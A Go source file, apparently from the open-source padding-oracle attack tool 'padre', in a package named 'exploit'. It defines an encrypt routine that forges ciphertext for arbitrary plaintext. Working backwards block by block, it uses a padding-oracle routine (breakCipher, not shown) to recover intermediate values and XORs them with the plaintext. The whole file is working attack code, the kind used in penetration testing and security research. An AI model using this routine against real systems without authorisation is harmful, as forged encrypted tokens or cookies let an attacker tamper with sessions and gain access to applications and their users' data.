package exploit

import (
	"fmt"

	"github.com/glebarez/padre/pkg/util"
)

func (p *Padre) encrypt(plainText string, blockLen int, byteStreamer func(byte)) ([]byte, error) {
	// pad
	plainText = pkcs7Pad(plainText, blockLen)

	// count the blocks
	blockCount := len(plainText) / blockLen

	// initialize a slice that will contain our cipherText (blockCount + 1 for IV)
	cipher := append(make([]byte, blockLen*blockCount), util.RandomSlice(blockLen)...)

	// // initialize status bar
	// currentStatus.openBar(len(cipher))
	// defer currentStatus.closeBar()

	// the last block is already known, so we report in to status
	// currentStatus.fetchOutputBytes(cipher[blockLen*blockCount:])

	/* Start with the last block and move towards the 1st block.
	Each block is used successively as a IV and then as a cipherText in the next iteration */
	for blockNum := blockCount; blockNum >= 1; blockNum-- {
		// mark indexes
		x := (blockNum - 1) * blockLen
		y := blockNum * blockLen
		z := (blockNum + 1) * blockLen

		plainBlock := []byte(plainText)[x:y]

		// get nulling IV
		nullingIV, err := p.breakCipher(cipher[y:z], createXORingFetcher(plainBlock))
		if err != nil {
			return nil, fmt.Errorf("error occurred while encrypting block %d: %w", blockNum, err)
		}

		// reveal the cipher
		copy(cipher[x:y], xorSlices(plainBlock, nullingIV))
	}
	return cipher, nil
}
